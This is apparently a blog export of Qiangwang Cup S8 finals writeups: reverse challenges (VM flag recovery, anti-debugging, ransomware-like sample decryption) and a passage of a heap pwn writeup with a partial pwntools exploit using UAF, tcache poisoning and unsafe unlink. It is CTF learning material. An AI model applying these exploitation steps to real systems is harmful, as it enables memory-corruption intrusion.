class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> v[]=&#123;</span><br><span class="line"><span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">31</span>,<span class="number">97</span>,<span class="number">3</span>,<span class="number">41</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">29</span>,<span class="number">97</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">71</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">7</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">89</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">73</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">59</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">79</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">79</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">79</span>,<span class="number">97</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">61</span>,<span class="number">3</span>,<span class="number">71</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">79</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">31</span>,<span class="number">97</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">53</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">73</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">47</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">59</span>,&#125;;</span><br><span class="line"><span class="type">char</span> target[]=&#123;<span class="number">70</span>,<span class="number">56</span>,<span class="number">70</span>,<span class="number">77</span>,<span class="number">74</span>,<span class="number">90</span>,<span class="number">87</span>,<span class="number">82</span>,<span class="number">60</span>,<span class="number">67</span>,<span class="number">86</span>,<span class="number">95</span>,<span class="number">64</span>,<span class="number">94</span>,<span class="number">85</span>,<span class="number">66</span>,<span class="number">33</span>,<span class="number">69</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">94</span>,<span class="number">93</span>,<span class="number">90</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">65</span>,<span class="number">93</span>,<span class="number">96</span>,&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">checkval</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> pos)</span>&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">sum+=((i&gt;&gt;j)&amp;<span class="number">1</span>)*v[j+pos*<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(target);i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0x20</span>;j&lt;<span class="number">127</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i]==checkval(j,i))&#123;</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//s1mpl3_VM_us3s_link3d_l1st_st4ck</span></span><br></pre></td></tr></table></figure><p>输入后得到 <code>flag</code>。</p><img src="/2024/12/11/qwb2024_final_reverse/3.png" class=""><p>最后注意一下，这个反调试有点隐蔽，只要中了反调试就会修改 quest 这个文件，如果你不注意文件修改日期的话那么永远也算不出正确答案了。</p><h3 id="反调试手段分析"><a href="#反调试手段分析" class="headerlink" title="反调试手段分析"></a>反调试手段分析</h3><p>如何发现反调试？通常情况下，我们不会刻意地去注意反调试，只有当程序提示，报错，运行结果附加调试器与不附加调试器运行结果有较大差异时，才会去注意反调试。</p><p>这里程序初始化的时候会拉起反调试，不过需要非常仔细，能够敏锐地观察到 vm 的代码文件被修改了。</p><img src="/2024/12/11/qwb2024_final_reverse/4.png" class=""><p>首先确定反调试的位置，在main函数下断点，检查文件是否被修改。</p><img src="/2024/12/11/qwb2024_final_reverse/5.png" class=""><p>发现main函数之前反调试就运行完了，那么就要讲到 main 函数之前调用的代码了，在 Linux 中，会保存一个 init_array，它会保存一系列的函数指针，这些函数先于 main 被调用；同样的，在 windows 中也有类似的。</p><p>通过 initterm 函数交叉引用找到 First 指针，获取函数指针的起始地址。</p><img src="/2024/12/11/qwb2024_final_reverse/6.png" class=""><p>在指向的函数中，<code>sub_140001190</code> 是反调试的关键函数</p><img src="/2024/12/11/qwb2024_final_reverse/7.png" class=""><p>其中对 FileName 变量似乎在做一个异或解密的操作，异或的key是0x69，dump下来解密之后发现果然是在对目标文件进行操作。</p><img src="/2024/12/11/qwb2024_final_reverse/8.png" class=""><p>下面一系列就是写这个文件了，不过在这之前有一个关键判断 <code>qword_14002ED10</code>，这个函数指针保存了哪个函数，大概率是 IsDebuggerPresent 了，但是还是去验证一遍。</p><p>交叉找到赋值的位置，是在这之前执行的函数内容。</p><img src="/2024/12/11/qwb2024_final_reverse/9.png" class=""><p>下断点，看看能否断在这里，发现果真如我们所料</p><img src="/2024/12/11/qwb2024_final_reverse/10.png" class=""><p>那么这个反调试的过程就是在main函数之前先执行了两个函数，一个函数获取 IsDebuggerPresent 函数的地址保存在全局变量中，第二个函数调用这个 API 判断，如果的确被调试那么修改 quest 的文件内容。</p><p>对于这个绕过直接上 xdbg 的反调试插件 or 修改文件名，队爹就是直接上 xdbg 甚至感受不到反调试的存在，而我狂踩坑…</p><h2 id="UnsafeFile"><a href="#UnsafeFile" class="headerlink" title="UnsafeFile"></a>UnsafeFile</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><a href="UnsafeFile_fc430c76e4728fdfc829eee12723cbdd.zip">附件下载</a>，解压密码 <code>2024qwbfinal</code>。</p><blockquote><p>作者在此申明：本题目为类勒索病毒分析的题目，若要分析请一定一定不要在个人电脑或者公共电脑上运行此程序，请在虚拟机中调试分析，若因此造成任何的损失与作者无关。</p></blockquote><p>以下是原题目描述</p><blockquote><p>小Y玩游戏很菜，于是他找了个神秘人要了一个修改器文件，在开启功能后，发现他的一个重要文件居然被加密了，你能想办法帮他恢复吗？</p><p>请不要在物理机上运行题目中的任何文件，主办方对由此造成的任何损失不承担任何责任，如有需要请在虚拟机内进行运行和调试，解压密码:2024qwbfinal</p></blockquote><h3 id="基本分析-1"><a href="#基本分析-1" class="headerlink" title="基本分析"></a>基本分析</h3><p>压缩包给了两个文件，一个是 CT 脚本，一个是 .pdf.yr，看起来 .yr 是一个勒索了 pdf 类型文件的后缀。</p><p>先看看 CT 脚本，运行之后会拉起 DBK 驱动，运行计算器，并且看标题似乎是一个植物大战僵尸的修改器。</p><img src="/2024/12/11/qwb2024_final_reverse/11.png" class=""><p>其中比较主要的就是运行了一个 <code>decodeFunction</code> 去解密一段函数运行，这里可以直接用<a href="https://github.com/FeeeeK/CEFunctionDecoder">网上的脚本</a>还原这段。</p><p>运行后得到一个 luac 文件，luac 文件需要用另一个工具去还原为 lua 脚本，这里我是用的是 <code>unluac_2023_12_24.jar</code>，同样附上下载地址：<a href="https://sourceforge.net/projects/unluac/files/Unstable/">https://sourceforge.net/projects/unluac/files/Unstable/</a></p><img src="/2024/12/11/qwb2024_final_reverse/12.png" class=""><p>前面都是一些赋值函数，拉到最后发现几个有意思的字符串，其中 <code>C:\\system.dll</code> 引起了注意，于是去对应目录下，能找到一个 dll 文件，那么毫无疑问，剩下的就是对 system.dll 进行分析了，lua 脚本应该就是做注入用的。</p><p>dllmain 一个很标准的起线程的动作</p><img src="/2024/12/11/qwb2024_final_reverse/13.png" class=""><p>这个 StartAddress 就比较有意思，一直执着于判断自身某个内存的标志位，循环，而循环体内就是一直在 Sleep。</p><p>中间用 FindCrypt 发现 AES 的模式。</p><img src="/2024/12/11/qwb2024_final_reverse/14.png" class=""><p>那么毫无疑问，勒索的文件应该是使用 AES 加密的，交叉找到对应的函数，其中一个是 <code>10001840</code>，另一个是 <code>10001790</code>。</p><p>静态分析比较难了，下面开始动态分析。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>因为是个 dll，还不像 exe 那样好调试，这里我写了一个简单的 demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接远线程注入这个模块，为了能断下，选择 patch dll 的 dllmain 函数开头为 <code>int 3</code></p><img src="/2024/12/11/qwb2024_final_reverse/15.png" class=""><p>然后，虚拟机里</p><p>x32 起被调试程序，用注入器注入这个 dll。</p><img src="/2024/12/11/qwb2024_final_reverse/16.png" class=""><p>程序成功被断下来</p><img src="/2024/12/11/qwb2024_final_reverse/17.png" class=""><p>这里可以去恢复 int 3 指令然后重新执行一遍。</p><p>如果不改那个标志位，发现 <code>while ( !byte_1000C6DC )</code> 将会是一个死循环，这里估计是要等某个合适的时机，因此找到这个标志位将它赋值为1。</p><img src="/2024/12/11/qwb2024_final_reverse/18.png" class=""><p>跳出循环之后，执行了一个函数</p><img src="/2024/12/11/qwb2024_final_reverse/19.png" class=""><p>看字符串，获取了用户名，又有 Documents 字符串，猜测是对我们用户目录下的文档文件感兴趣，这里可以随意写几个pdf文件让它加密看看它的规律。</p><p>往后跟进几步，发现关键字符串</p><img src="/2024/12/11/qwb2024_final_reverse/20.png" class=""><p>往后跟进之后发现，抛异常了，不过很幸运的是，栈中有数据提示我们</p><img src="/2024/12/11/qwb2024_final_reverse/21.png" class=""><p>文件大小需要时 16 的倍数，那就换一个 16 个 a 的 pdf 文件再来一次。</p><p>随后调试到调用 AES 函数之前，这里需要分析一下这个参数的作用，调用约定属于 thiscall，this 指针存 ECX，其余参数从右往左压入栈中。</p><img src="/2024/12/11/qwb2024_final_reverse/22.png" class=""><p>这里记录一下第三个参数指向的一片内存，这个内存每次运行都不一样，先记录一下。</p><p><code>C3 67 B7 93 5E 0D AB 9A 48 3D BA EB 65 5F B5 92</code></p><p>而第二个参数就是指向了一片 <code>0xBAADF00D</code> 的内存。运行放过去，同时火绒剑也查获了一下这个 dll 的行为。</p><img src="/2024/12/11/qwb2024_final_reverse/23.png" class=""><p>加密文件，删除文件，典型的勒索病毒，同时也注意到多次运行的加密结果是不一样的，而且原本16字节的结果变成了48字节，AES就算是 padding 模式也不会多 32 字节，于是断定它必然是随机加密，而密钥肯定也保存到了文件里，这里 AES 的参数很有可能就是密钥。</p><img src="/2024/12/11/qwb2024_final_reverse/24.png" class=""><p>其实原本这里有点山穷水尽了，后面的结论要得出来对我就比较看运气（高手肉眼就看出来）了。</p><p>偶然的情况下，上面的第二个参数生成了 00 字节，而对应的第二行位置上生成了 0x5A，又联想到之前 lua 脚本写过一段异或 0x5a 的脚本。</p><img src="/2024/12/11/qwb2024_final_reverse/25.png" class=""><p> 相对应地，去源码中找到这一段 <code>system.dll+25C6</code>，在此下断点调试。</p><img src="/2024/12/11/qwb2024_final_reverse/26.png" class=""><p>发现它在异或 0068D14D 的内存，异或了 0x10 个字节，难道说这就是所看到的密钥，验证一遍</p><img src="/2024/12/11/qwb2024_final_reverse/27.png" class=""><p>发现果然就是它会将真实密钥每个字节异或 0x5A 之后保存到倒数第二行，那么最后一行必然不可能是 padding，猜测应该是初始向量，这是一个 CBC 模式的 AES。</p><p>通过研究 lua 脚本还发现，它似乎还对 DLL 进行了 hook，并且使用了 WriteByte 将 <code>system.dll+C6DC</code> 写为了 1，好样的，就是前面死循环的条件 <code>while(!byte_1000C6DC)</code>，在这一刻完成了闭环。这个 dll 不仅用 lua 进行注入，还进行了一定的 hook，直接运行分析样本可能真分析不太出来，其实这里猜也能猜个大概了，但是作者这里觉得还是力求分析完整这个样本。</p><p>首先看看 initterm 函数的函数指针，发现了一些有意思的函数</p><img src="/2024/12/11/qwb2024_final_reverse/28.png" class=""><p>使用 <code>std::_Random_device</code> 获取随机数，随后使用梅森旋转算法计算后续的随机数，这里 <code>0x6C078965</code> 是该算法的一个常数，搜也是能搜出来的。</p><p>而随后将计算出的这么多随机数，使用一定的算法将某 0x10 个字节赋值到了 this 指针，一共调用了两次这个函数，一个在 <code>sub_10001000</code>，另一个在 <code>sub_10001020</code>。赋值的全局变量分别在 <code>1000C6E0</code> 和 <code>1000C6EC</code>，这个是一开始就生成好的。</p><p>自己再去调试一遍也可以验证得到 <code>1000C6E0</code> 指针所指向的值，就是被异或加密前的密钥，或者说就是 pdf 倒数第二行异或 0x5A 的结果，而最后一行的结果与 <code>1000C6EC</code> 指针所指向的内容是一致的。</p><p>因此可以验证一遍：</p><img src="/2024/12/11/qwb2024_final_reverse/29.png" class=""><p>确定没问题之后就可以开始恢复 pdf 文件了，但是因为我的 system.dll 没有做 hook，而 lua 脚本运行的时候做了 hook，因此在题目加密的 pdf 文件中，要先交换高低半个字节，再异或，才是原始密钥。</p><p>先写一下解密 key 的脚本：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[]=<span class="string">&quot;\xcd\x8b\x95\xe3\x1f\x16\xd9\x21\x6b\x3c\x3c\x24\xb2\x6e\x98\xe7&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t=key[i]&amp;<span class="number">0xf</span>;</span><br><span class="line">key[i]&gt;&gt;=<span class="number">4</span>;</span><br><span class="line">key[i]|=t&lt;&lt;<span class="number">4</span>;</span><br><span class="line">key[i]^=<span class="number">0x5A</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>,key[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿得到的结果去解密</p><img src="/2024/12/11/qwb2024_final_reverse/30.png" class=""><p>可以发现已经是一个 pdf 文件头了，下载，打开查看，flag 到手。</p><img src="/2024/12/11/qwb2024_final_reverse/31.png" class=""><hr><p>还有一道 bvp47 也是一道恶意样本分析的题，但是目前精力有限，可能要咕很久才能做出来了233。</p>]]></content>
    
    
    <summary type="html">复盘一下强网决赛的Reverse题</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8决赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/"/>
    
    <category term="Reverse" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯S8决赛pwn writeup</title>
    <link href="https://xia0ji233.github.io/2024/12/08/qwb2024_final/"/>
    <id>https://xia0ji233.github.io/2024/12/08/qwb2024_final/</id>
    <published>2024-12-07T17:00:00.000Z</published>
    <updated>2025-01-16T12:47:03.578Z</updated>
    
    <content type="html"><![CDATA[<p>同样的，决赛也出了两道pwn题，感觉挺有意思的，来补补wp。</p><span id="more"></span><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p><a href="heap_56fc53234d59e2df8d0d87941a8b8134.zip">附件下载</a></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>这题一开始最大的一个问题可能是题目依赖较多跑不起来，而且只给了 libc 的版本，是 <code>2.31 9.16</code> 版本，这个比较好说。如果是 libcrypto.1.1 这个库不存在也好说，apt 安装就好了。</p><p>照常换了 runpath 和链接器之后报了一个神奇的错误。</p><img src="/2024/12/08/qwb2024_final/1.png" class=""><p>这里的意思就是，虽然你 elf 文件的 libc 换好了，但是 libcrypto.so.1 这个库用的是高版本的 libc，你换了之后 libcrypto.so.1 有些引用了高版本 glibc 的函数就用不了了，所以索性在加载的时候报出错误存在这个问题。</p><p>解决这个问题也很简单，如果不想影响机器的 libcrypto 库那就复制一份出来，将依赖修改到本地的备份版本即可，再用 –replace-needed 参数去替换依赖库。</p><p>例子：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libcrypto.so.1.1 ./libcrypto.so.1.1 ./heap</span><br></pre></td></tr></table></figure><p>此时你还需要将 libcrypto.so.1.1 的依赖库换成对应的版本，才能正常运行。</p><p>最终修改完以来之后，你的两个文件依赖项应该如下所示：</p><img src="/2024/12/08/qwb2024_final/2.png" class=""><p>这样你就能正常运行这个题目了。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目很友好，没有去符号，init_system 里面初始化了 Key，heap_base，和沙箱。</p><img src="/2024/12/08/qwb2024_final/3.png" class=""><p>沙箱就是简单地禁用了 execve 调用，增删改查一应俱全，一步步分析。</p><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><img src="/2024/12/08/qwb2024_final/4.png" class=""><p>下标 0-15还挺大，固定分配 0x30 大小的堆块，读入也是这么长，随后使用 AES 加密保存输入的内容。</p><p>注意到使用了 safe_malloc，而 safe_malloc 检查了 malloc 的返回值，需要与 key 所分配的堆块在同一个页上（即地址除了最低三位十六进制不同，其它必须相同），这样就会导致我们很多漏洞不能利用。</p><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><img src="/2024/12/08/qwb2024_final/5.png" class=""><p>明显是存在 UAF 漏洞的。</p><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><img src="/2024/12/08/qwb2024_final/6.png" class=""><p>同样 AES 加密内容改了上去。</p><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><img src="/2024/12/08/qwb2024_final/7.png" class=""><p>将堆块内容 AES 解密后输出。</p><h4 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h4><img src="/2024/12/08/qwb2024_final/8.png" class=""><p>可以观察到，当 <code>a2 &lt; 16</code> 的时候是不会进行加密的，也就是说输入的明文会直接存储到堆上，解密函数同理。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>UAF是主要的漏洞点，根据UAF可以搞很多事，同时也有许多限制，来列一下目前的限制：</p><ol><li>堆块分配的地址被定死在了堆首的第一个页</li><li>输入的内容超过16字节会被随机Key加密。</li><li>沙箱保护</li></ol><p>对应的解决措施如下：</p><ol><li>堆块指针被限制了那么就可以不用堆块分配指针，而是直接劫持指针，而堆攻击手法里面可以直接劫持指针的方法就是 unsafe unlink了。</li><li>被随机密钥加密首先就想到，可以利用一个 tcache bin attack 劫持 key 所在的堆块，将密钥强制写为 0 字节，这样密钥就等于已知，但是密钥有 16 个长度怎么办呢？刚好 2.31 tcache 取出 free 块的时候会清空 bk 指针，因此写入 8 字节就可以达到清空 Key 的目的。</li><li>沙箱保护 orw 即可绕过。</li></ol><p>理论可行，下面来实践</p><h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>据此构造交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br></pre></td></tr></table></figure><p>由于 unsafe unlink 的利用手法需要知道堆指针的地址，而题目程序开了 PIE，所以第一步要先想办法泄露程序的基地址。</p><p>注意到解密函数是将内容解密到栈上输出的，因此栈上可能有可以利用的地址。</p><img src="/2024/12/08/qwb2024_final/9.png" class=""><p>0x20 个 a 扔过去发现的确存在一个程序基地址，虽然被覆盖了两个字节，但是依稀可辨。在比赛中我选择了爆破这半个字节，但其实完全没必要，因为可以发现被覆盖的两个字节是由于自己输入了 <code>3\n</code>，而这里的数字输入显然使用 read，那就没必要输入这个回车，可以少覆盖一个字节，这样就完全不用爆破。</p><p>将交互函数的 line 去掉如下所示</p><img src="/2024/12/08/qwb2024_final/10.png" class=""><p>拿到了 code_base 之后，tcache bin attack，这里这样操作：free 两个堆块，再改最后进入的堆块的 fd 指针到 key 堆块的位置。因为 2.31 版本的 tcache 有数量检查，如果检查到数量为0，即使 tcache存的堆块指针不为 0，那也不会被分配。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\nP&#x27;</span>)[-<span class="number">8</span>:-<span 